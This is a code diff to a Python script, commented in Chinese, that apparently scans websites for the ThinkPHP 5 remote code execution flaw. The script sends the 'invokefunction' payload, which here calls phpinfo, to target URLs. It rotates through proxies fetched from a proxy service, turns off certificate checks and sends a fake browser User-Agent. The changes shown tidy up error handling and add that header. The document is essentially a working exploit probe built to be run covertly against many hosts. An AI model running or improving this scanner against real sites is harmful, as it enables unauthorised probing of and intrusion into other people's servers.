@@ -25,15 +25,9 @@ def fetch_proxies(count=PROXY_COUNT, protocol="http"):
                 proxies = data["data"].get("proxies", [])
                 print(f"[*] 获取到 {len(proxies)} 个代理")
                 return proxies
-     except requests.exceptions.Timeout:
-         pass  # 超时跳过,函数中不可使用continue
-     except requests.exceptions.ConnectionError:
-         pass  # 连不上跳过
-     except requests.exceptions.ProxyError:
-         pass  # 代理坏了跳过
-     except requests.exceptions.RequestException:
-         pass  # 所有其他错误兜底
-     return []
+    # 修复：缩进错误 + 规范异常捕获
+    except requests.exceptions.RequestException:
+        return []
 
 def get_proxy():
     """获取一个代理，如果列表为空则重新拉取"""
@@ -41,7 +35,10 @@ def get_proxy():
     if not proxy_list:
         proxy_list = fetch_proxies()
     return random.choice(proxy_list) if proxy_list else None
+
 threadings=[]
+# 新增请求头
+headers = {"User-Agent": "Mozilla/5.0"}
 def poc(url):
     texts=[
         r"/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",       
@@ -52,15 +49,13 @@ def poc(url):
         try:
             proxy = get_proxy()
             proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
-            resp = requests.get(pocurl, proxies=proxies, verify=False, timeout=5) #避免ssl证书报错，Web poc用get
+            # 修复：增加请求头
+            resp = requests.get(pocurl, headers=headers, proxies=proxies, verify=False, timeout=5)
             if  resp.status_code == 200 and "phpinfo" in resp.text:
                 print("thinkphp5漏洞存在----------",url)
                 return 
-            else:
-                print("False")
-                pass
-        except:
-           
+        # 修复：规范异常捕获
+        except Exception:
             pass
                     
 
@@ -108,12 +103,5 @@ else:
 3.
 
 """
-
-
-
-
-
-
-
 
 
